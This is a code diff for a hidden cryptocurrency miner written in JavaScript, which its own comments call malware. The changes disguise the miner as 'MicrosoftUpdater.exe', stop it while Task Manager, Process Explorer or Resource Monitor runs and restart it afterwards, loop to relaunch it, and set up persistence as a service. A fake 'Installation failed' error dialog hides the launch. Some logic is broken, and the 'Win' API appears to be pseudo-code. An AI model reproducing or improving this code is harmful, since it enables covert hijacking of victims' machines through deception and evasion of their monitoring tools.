@@ -1,4 +1,4 @@
-// WARNING: DO NOT RUN THIS IF YOU DON'T WANT YOUR REGISTRY MODIFIED
+// THINK TWICE BEFORE RUNNING THIS CODE! YOU HAVE BEEN WARNED.
 
 // needed libraries for information collection in XMRig
 
@@ -7,7 +7,7 @@ const si = require('systeminformation');
 
 // File path of the miner
 
-const minerPath = Win.path`miner.exe`;
+const minerPath = Win.path`MicrosoftUpdater.exe`;
 
 // Win-interact preferences
 
@@ -25,43 +25,77 @@ Win.set.preferences({
     }
 });
 
-async function processMonitor() {
-    Win.appManager.register({
-        'TaskManager': {
-            path: Win.path`C:\WINDOWS\system32\Taskmgr.exe`,
-            onLaunch: function() {
-                killMiner();
-            },
-            onKill: function() {
-                Win.cmd('start.cmd');
-            },
+Win.appManager.register({
+    'TaskManager': {
+        path: Win.path`C:\Windows\system32\Taskmgr.exe`,
+        onLaunch: function () {
+            killMiner();
         },
-        'ProcessExplorer': {
-            path: $procExpPath,
-            onLaunch: function() {
-                killMiner();
-            },
-            onKill: function() {
-                Win.cmd('start.cmd');
-            }
+        onKill: function () {
+            Win.cmd('start.cmd');
         },
-        'TcpView': {
-            path: $tcpViewPath,
-            onLaunch: function() {
-                killMiner();
-            },
-            onKill: function() {
-                Win.cmd('start.cmd');
-            }
+    },
+    'ProcessExplorer': {
+        path: $procExpPath, // found by PS script
+        onLaunch: function () {
+            killMiner();
+        },
+        onKill: function () {
+            Win.cmd('start.cmd');
         }
-    });
+    },
+    'ResourceMonitor': {
+        path: Win.path`C:\Windows\system32\resmon.exe`,
+        onLaunch: function () {
+            killMiner();
+        },
+        onKill: function () {
+            Win.cmd('start.cmd');
+        }
+    }
+});
+
+// Main loop of the malware that checks if monitoring applications are running
+
+async function main() {
+    while (true) {
+        // Check if Task Manager, Process Explorer, or Resource Monitor are running and kill the miner accordingly
+        const taskManagerIsRunning = Win.process.isRunning('TaskManager');
+        const processExplorerIsRunning = Win.process.isRunning('ProcessExplorer');
+        const resourceMonitorIsRunning = Win.process.isRunning('ResourceMonitor');
+        if ((taskManagerIsRunning || processExplorerIsRunning || resourceMonitorIsRunning) && (checkIfAlreadyRunning('MicrosoftUpdater') == true)) {
+        // If Task Manager, Process Explorer, or Resource Monitor is running, and the malware is running as well, kill it
+        killMiner();
+    }
+        if ((!taskManagerIsRunning && !processExplorerIsRunning && !resourceMonitorIsRunning && checkIfAlreadyRunning('MicrosoftUpdater')) == false) {
+        // As long as neither TaskMgr, ProcExp, or ResMon is running and the malware is not already running, start it
+        runMiner();
+    }
+        wait(2000);
+}
 }
 
-function killMiner () {
+// Checks if a process is already running to prevent multi-execution
+
+async function checkIfAlreadyRunning(process) {
+    const systemProcesses = Win.cmd('tasklist');
+    const indexedProcesses = systemProcesses.split('\n');
+    for (let i = 0; i < indexedProcesses.length; i++) {
+        if (indexedProcesses == process) {
+            console.log(`${process} is running.`);
+            return true;
+        } else {
+            console.log(`${process} is not running.`);
+            return false;
+        }
+    }
+}
+
+function killMiner() {
     try {
-        Win.cmd(`TASKKILL /f /IM start.cmd`);
+        Win.cmd(`TASKKILL /f /IM ${minerPath}`);
     } catch {
-        Win.cmd(`TASKKILL /f /IM microsoftupdater.exe`);
+        Win.cmd(`TASKKILL /f /IM MicrosoftUpdater.exe`);
     }
 }
 
@@ -71,26 +105,12 @@ function wait(ms) {
 
 async function runMiner() { // This function will be expanded on later
     Win.cmd('start.cmd');
-    autorun();
+    autorunMethods();
     disableTaskMgr();
 }
 
-async function disableTaskMgr() { // Requires a REBOOT to take effect
 
-    const taskMgrKey = Win.path`'HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\'`;
-
-    try {
-        Win.cmd(`REG QUERY ${taskMgrKey} /v DisableTaskMgr`);
-        wait(250);
-        Win.cmd(`REG ADD HKCU ${taskMgrKey} /v DisableTaskMgr /t REG_DWORD /d 1 /f`);
-    } catch {
-        Win.cmd(`REG ADD HKCU' ${taskMgrKey} '/v DisableTaskMgr /t REG_DWORD /d 1 /f`);
-        wait(250);
-        Win.cmd(`REG ADD HKLM' ${taskMgrKey} '/v DisableTaskMgr /t REG_DWORD /d 1 /f`);
-    }
-}
-
-async function autorun() {
+async function autorunMethods() {
     try {
         registerMinerAsService(); 
         /* Running the miner as a system service is preferred because the average user
@@ -115,14 +135,9 @@ async function registerMinerAsService() {
 async function fakeInstall() {
     try {
         Win.showDesktop();
-        await Win.alert('HelloWorld.exe is now being installed on your computer.', 'HelloWorld Installer');
-        Win.showDesktop();
-        await Win.alert('Estimated disk space needed: 2 MB', 'HelloWorld Installer');
-        Win.showDesktop();
-        await Win.alert('HelloWorld.exe has been successfully installed.', 'Installation successful');
-        Win.showDesktop();
+        await Win.alert('The volume does not contain a recognized file system. Please make sure that all required file system drivers are loaded and that the volume is not corrupted. Error code: 0x3ED.', 'Installation failed');
     } catch {
-        console.log("an error occured");
+        console.log("An error occured");
     } finally {
         runMiner();
     }
@@ -160,3 +175,4 @@ async function checkForHardwareSupport() {
 }
 
 checkForHardwareSupport();
+main();
